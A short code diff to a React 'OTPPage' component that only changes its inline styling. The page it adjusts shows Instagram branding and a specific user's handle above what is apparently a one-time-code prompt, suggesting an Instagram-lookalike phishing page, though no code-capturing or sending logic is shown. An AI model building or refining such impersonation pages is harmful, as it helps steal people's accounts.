@@ -18,7 +18,13 @@ export default function OTPPage() {
   }, []);
 
   return (
-    <div style={{ backgroundColor: "#000", color: "#fff", fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
+    <div style={{
+      backgroundColor: "#000",
+      color: "#fff",
+      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
+      minHeight: "100vh", // ✅ Fix added here
+      boxSizing: "border-box"
+    }}>
       <div style={{ padding: "16px 0 10px", borderBottom: "1px solid #222", textAlign: "center" }}>
         <img src="/instagram-icon.png" alt="Instagram Icon" style={{ width: "30px", height: "30px", verticalAlign: "middle", marginRight: "8px" }} />
         <span style={{ fontWeight: 600, fontSize: "16px", verticalAlign: "middle" }}>ruma.rahman7 • Instagram</span>
